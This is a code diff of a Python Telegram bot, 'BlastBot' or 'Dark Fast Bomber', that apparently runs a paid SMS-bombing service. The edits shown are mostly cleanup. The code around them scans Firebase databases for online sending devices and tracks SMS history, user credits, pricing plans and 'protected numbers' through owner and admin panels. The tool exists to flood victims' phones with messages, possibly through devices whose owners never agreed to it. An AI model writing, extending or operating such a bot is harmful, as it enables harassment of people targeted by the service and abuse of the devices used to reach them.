@@ -24,6 +24,13 @@ logging.basicConfig(
 )
 log = logging.getLogger("BlastBot")
 
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+    log.info("📄 .env loaded")
+except ImportError:
+    pass
+
 # ========== PREMIUM EMOJI IDs ==========
 EMOJI_FIRE = "5289722755871162900"
 EMOJI_STAR = "5372849966689566579"
@@ -101,10 +108,9 @@ SUPABASE_SYNC_INTERVAL = 5.0
 
 _supabase_client = None
 _supabase_init_failed = False
-_supabase_lock = None  # set in main()
+_supabase_lock = None
 
 def _get_supabase():
-    """Lazy init Supabase client. Returns None if not configured."""
     global _supabase_client, _supabase_init_failed
     if _supabase_client is not None:
         return _supabase_client
@@ -112,7 +118,7 @@ def _get_supabase():
         return None
     if not SUPABASE_URL or not SUPABASE_KEY:
         _supabase_init_failed = True
-        log.warning("⚠️  Supabase not configured — running in LOCAL FILE mode")
+        log.warning("⚠️ Supabase not configured — running in LOCAL FILE mode")
         return None
     try:
         from supabase import create_client
@@ -242,12 +248,10 @@ def _default_data() -> dict:
         "protected_numbers": {}
     }
 
-# ================== DATA LOAD/SAVE WITH SUPABASE ==================
 _mem_cache = None
 _latest_data = None
 _data_dirty = False
 _last_sync_hash = None
-
 
 def _apply_defaults(data: dict) -> dict:
     default = _default_data()
@@ -263,16 +267,11 @@ def _apply_defaults(data: dict) -> dict:
             u["sms_history"] = []
     return data
 
-
 def load() -> dict:
-    """Load data. First call pulls from Supabase → then cached in memory."""
     global _mem_cache
     if _mem_cache is not None:
         return json.loads(json.dumps(_mem_cache, ensure_ascii=False))
-
     data = None
-
-    # 1. Try Supabase
     client = _get_supabase()
     if client:
         try:
@@ -286,8 +285,6 @@ def load() -> dict:
                     log.info("✅ Data loaded from Supabase")
         except Exception as e:
             log.error(f"Supabase load error: {e}")
-
-    # 2. Fallback: local file
     if data is None and os.path.exists(_DATA_FILE):
         try:
             with open(_DATA_FILE, "r", encoding="utf-8") as f:
@@ -295,92 +292,68 @@ def load() -> dict:
             log.info("📁 Data loaded from local file")
         except Exception as e:
             log.error(f"Local file load error: {e}")
-
-    # 3. Fallback: fresh defaults
     if data is None:
         data = _default_data()
         log.info("🆕 Fresh default data created")
-
     data = _apply_defaults(data)
     _mem_cache = data
-
-    # Write local backup file
     try:
         with open(_DATA_FILE, "w", encoding="utf-8") as f:
             json.dump(data, f, indent=2, ensure_ascii=False)
     except Exception as e:
         log.error(f"Local file write error: {e}")
-
-    # Also schedule initial push to Supabase if empty
     global _latest_data, _data_dirty
     _latest_data = data
     if client and not data.get("users"):
         _data_dirty = True
-
     return json.loads(json.dumps(data, ensure_ascii=False))
 
-
 def save(d: dict):
-    """Save data: writes local file immediately + marks dirty for Supabase sync."""
     global _mem_cache, _latest_data, _data_dirty
     _mem_cache = d
     _latest_data = d
     _data_dirty = True
-
     try:
         with open(_DATA_FILE, "w", encoding="utf-8") as f:
             json.dump(d, f, indent=2, ensure_ascii=False)
     except Exception as e:
         log.error(f"Local file save error: {e}")
 
-
 async def supabase_sync_loop():
-    """Background task: pushes dirty data to Supabase every N seconds."""
     global _data_dirty, _last_sync_hash
     client = _get_supabase()
     if not client:
-        log.info("ℹ️  Supabase sync loop skipped (not configured)")
+        log.info("ℹ️ Supabase sync loop skipped (not configured)")
         return
-
     log.info(f"🔄 Supabase sync loop started (interval: {SUPABASE_SYNC_INTERVAL}s)")
     while True:
         try:
             await asyncio.sleep(SUPABASE_SYNC_INTERVAL)
             if not _data_dirty or _latest_data is None:
                 continue
-
             data = _latest_data
-            h = hashlib.md5(
-                json.dumps(data, sort_keys=True, ensure_ascii=False).encode()
-            ).hexdigest()
-
+            h = hashlib.md5(json.dumps(data, sort_keys=True, ensure_ascii=False).encode()).hexdigest()
             if h == _last_sync_hash:
                 _data_dirty = False
                 continue
-
             snapshot = json.loads(json.dumps(data, ensure_ascii=False))
-
             def _do_upsert():
                 client.table(SUPABASE_TABLE).upsert({
                     "id": SUPABASE_ROW_ID,
                     "data": snapshot,
                     "updated_at": datetime.utcnow().isoformat() + "Z"
                 }).execute()
-
             await asyncio.to_thread(_do_upsert)
             _last_sync_hash = h
             _data_dirty = False
             log.info(f"✅ Supabase sync OK ({len(snapshot.get('users', {}))} users)")
-
         except asyncio.CancelledError:
             break
         except Exception as e:
             log.error(f"Supabase sync error: {e}")
             await asyncio.sleep(3)
 
-
 async def supabase_final_sync():
-    """Push current data to Supabase on shutdown."""
     client = _get_supabase()
     if not client or _latest_data is None:
         return
@@ -396,7 +369,6 @@ async def supabase_final_sync():
         log.info("💾 Final Supabase sync done")
     except Exception as e:
         log.error(f"Final sync failed: {e}")
-
 
 def reg_user(uid: int, name: str, d: dict) -> bool:
     k = str(uid)
@@ -548,16 +520,12 @@ def mask_number(number: str) -> str:
 
 def get_scan_status() -> str:
     global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS
-
     if SCANNING_IN_PROGRESS:
         return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
-
     if not CACHED_DEVICES:
         return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
-
     device_count = len(CACHED_DEVICES)
     time_diff = time.time() - LAST_SCAN_TIME
-
     if time_diff < 60:
         return f"{em(EMOJI_CHECK, '🟢')} {device_count} ᴅᴇᴠɪᴄᴇs"
     elif time_diff < 300:
@@ -567,24 +535,19 @@ def get_scan_status() -> str:
 
 async def background_firebase_scanner(bot: Bot):
     global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG
-
     log.info("Background Firebase Scanner STARTED")
     first_scan_done = False
-
     while True:
         async with SCAN_LOCK:
             if SCANNING_IN_PROGRESS:
                 await asyncio.sleep(5)
                 continue
             SCANNING_IN_PROGRESS = True
-
         SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
         start_scan = time.time()
-
         try:
             d = load()
             fbs = d.get("firebases", [])
-
             if not fbs:
                 SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs ᴄᴏɴғɪɢᴜʀᴇᴅ"
                 CACHED_DEVICES = []
@@ -592,12 +555,9 @@ async def background_firebase_scanner(bot: Bot):
                     SCANNING_IN_PROGRESS = False
                 await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                 continue
-
             devices = await get_all_online_devices(d)
             scan_duration = time.time() - start_scan
-
             CACHED_DEVICES = devices
-
             for fb in fbs:
                 fb_id = fb["id"]
                 fb_label = fb.get("label", fb["url"][:30])
@@ -608,7 +568,6 @@ async def background_firebase_scanner(bot: Bot):
                     "last_update": int(time.time())
                 }
             LAST_SCAN_TIME = time.time()
-
             health_entry = {
                 "timestamp": int(time.time()),
                 "devices_found": len(devices),
@@ -619,16 +578,13 @@ async def background_firebase_scanner(bot: Bot):
             DEVICE_HEALTH_LOG.append(health_entry)
             if len(DEVICE_HEALTH_LOG) > 100:
                 DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]
-
             if devices:
                 SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
                 log.info(f"[BG-SCAN] {len(devices)} devices online | {len(fbs)} DBs | {scan_duration:.1f}s")
-
                 current_fb_ids = {fb["id"] for fb in fbs}
                 stale_fb_ids = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
                 for stale in stale_fb_ids:
                     FB_DEVICE_COUNTS.pop(stale, None)
-
                 if not first_scan_done:
                     try:
                         await bot.send_message(
@@ -647,14 +603,12 @@ async def background_firebase_scanner(bot: Bot):
                     first_scan_done = True
             else:
                 SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
-
         except Exception as e:
             SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
             log.error(f"[BG-SCAN] Error: {e}")
         finally:
             async with SCAN_LOCK:
                 SCANNING_IN_PROGRESS = False
-
         await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
 
 def get_cached_devices() -> list:
@@ -703,7 +657,6 @@ async def get_all_online_devices(d: dict) -> list:
     current_fb_ids = {fb["id"] for fb in fbs}
     global CACHED_DEVICES
     CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
-
     _dev_sem = asyncio.Semaphore(15)
 
     async def fetch_one(fb: dict):
@@ -784,11 +737,9 @@ async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
 async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
     if is_owner(uid, d):
         return True, []
-
     fj = d.get("force_join", {})
     if not fj.get("enabled", False):
         return True, []
-
     channels = fj.get("channels", [])
     missing = []
     for ch in channels:
@@ -833,16 +784,13 @@ def owner_panel_text(d: dict) -> str:
     fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
     active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
     scan_info = get_scan_status()
-
     fb_lines = []
     for fb_id, fb_data in FB_DEVICE_COUNTS.items():
         age = int(time.time() - fb_data.get("last_update", 0))
         status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
         fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
     fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"
-
     protected_count = len(PROTECTED_NUMBERS)
-
     return (
         f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — ᴅᴀʀᴋ ꜰᴀꜱᴛ ʙᴏᴍʙᴇʀ {_VERSION}\n"
         f"<b>Owner:</b> {OWNER_NAME}\n\n"
@@ -870,16 +818,13 @@ def admin_panel_text(d: dict) -> str:
     mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
     active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
     scan_info = get_scan_status()
-
     fb_lines = []
     for fb_id, fb_data in FB_DEVICE_COUNTS.items():
         age = int(time.time() - fb_data.get("last_update", 0))
         status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
         fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
     fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"
-
     protected_count = len(PROTECTED_NUMBERS)
-
     return (
         f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — ᴅᴀʀᴋ ꜰᴀꜱᴛ ʙᴏᴍʙᴇʀ ʙᴏᴛ {_VERSION}\n"
         f"<b>Owner:</b> {OWNER_NAME}\n\n"
@@ -920,7 +865,7 @@ def owner_kb(d: dict) -> InlineKeyboardMarkup:
         [btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑"), btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡")],
         [btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥"), btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫")],
         [btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", EMOJI_CHECK, "✅"), btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢")],
-        [btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊"), btn("ᴀᴄᴛɪᴠɪᴛɪ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜")],
+        [btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊"), btn("ᴀᴄᴛɪᴠɪᴛʏ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜")],
         [btn("ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳"), btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁")],
         [btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰"), btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰")],
         [btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰"), btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰")],
@@ -954,11 +899,9 @@ def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
     per_page = 8
     total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
     page = max(0, min(page, total_pages - 1))
-
     start_idx = page * per_page
     end_idx = start_idx + per_page
     current_fbs = fbs[start_idx:end_idx]
-
     rows = [
         [
             btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕"),
@@ -973,7 +916,6 @@ def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
             btn(label, "noop", EMOJI_FIRE, "🔥"),
             btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑")
         ])
-
     nav_row = []
     if page > 0:
         nav_row.append(btn("◀️ ᴘʀᴇᴠ", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️"))
@@ -981,7 +923,6 @@ def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
         nav_row.append(btn("ɴᴇxᴛ ▶️", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️"))
     if nav_row:
         rows.append(nav_row)
-
     rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
     return InlineKeyboardMarkup(inline_keyboard=rows)
 
@@ -1022,7 +963,6 @@ def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeybo
     chunk = items[start:start + per]
     approved = d.get("approved", [])
     banned = d.get("banned", [])
-
     lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
     for uid_str, udata in chunk:
         uid = int(uid_str)
@@ -1035,7 +975,6 @@ def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeybo
         elif uid in d["admins"]: status = em(EMOJI_SHIELD, "🛡")
         else: status = em(EMOJI_STAR, "👤")
         lines.append(f"{status} <code>{uid}</code> — {name[:18]} | {em(EMOJI_MONEY, '💰')}{credits} | {em(EMOJI_CHECK, '📤')}{uses}")
-
     text = "\n".join(lines)
     rows = []
     nav = []
@@ -1049,7 +988,6 @@ def api_stats_text(d: dict) -> str:
     stats = d.get("stats", {})
     api_use = stats.get("api_usage", {})
     fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
-
     lines = [
         f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
         f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
@@ -2887,7 +2825,7 @@ async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
 
     text = f"{em(EMOJI_BELL, '🔗')} <b>Force Join Settings</b>\n\nStatus: {status}\nChannels: <b>{len(channels)}</b>\n\n"
     for ch in channels:
-        req = f"{em(EMOJI_CHECK, '✅')} Required" if ch.get("required", True) else f"{em(EMOJI_CROSS, '❌')} Optional"    
+        req = f"{em(EMOJI_CHECK, '✅')} Required" if ch.get("required", True) else f"{em(EMOJI_CROSS, '❌')} Optional"
         text += f"• {ch.get('title', 'Channel')} (<code>{ch['id']}</code>)\n  {req} | {ch['link']}\n\n"
 
     rows = [
@@ -3700,7 +3638,6 @@ async def main():
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(R)
 
-    # ---- Init data (pull from Supabase once at startup) ----
     d_init = load()
     PROTECTED_NUMBERS = d_init.get("protected_numbers", {}) or {}
     log.info(
@@ -3728,7 +3665,7 @@ async def main():
             f"{em(EMOJI_LOCK, '🔒')} <b>Number Protection:</b> ENABLED\n"
             f"{em(EMOJI_MONEY, '💸')} <b>Credit Transfer:</b> ENABLED\n"
             f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits All:</b> ENABLED\n"
-            f"{em(EMOJI_GEAR, '☁️')} <b>Supabase Sync:</b> {'ENABLED' if _get_supabase() else 'DISABLED (local file)'}\n"
+            f"{em(EMOJI_GEAR, '⚙️')} <b>Supabase Sync:</b> {'ENABLED' if _get_supabase() else 'DISABLED (local file)'}\n"
             f"👤 <b>Bot Owner:</b> {OWNER_NAME}",
             parse_mode="HTML"
         )
